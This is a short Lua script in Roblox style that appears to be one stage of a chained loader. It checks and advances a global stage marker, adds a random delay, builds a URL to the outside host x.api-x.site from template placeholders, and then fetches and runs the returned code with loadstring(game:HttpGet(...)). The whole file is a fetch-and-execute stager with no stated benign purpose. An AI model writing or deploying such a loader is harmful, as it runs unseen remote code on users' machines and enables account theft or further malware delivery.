if not _G.v or _G.v[2]~='s2'then return end
table.insert(_G.v,'s3')
if '${f}'=='F'then wait(math.random())end
local n=string.format("https://x.api-x.site?i=%s&s=%d&f=%s",'${i}',${s},'${f}')
loadstring(game:HttpGet(n))()
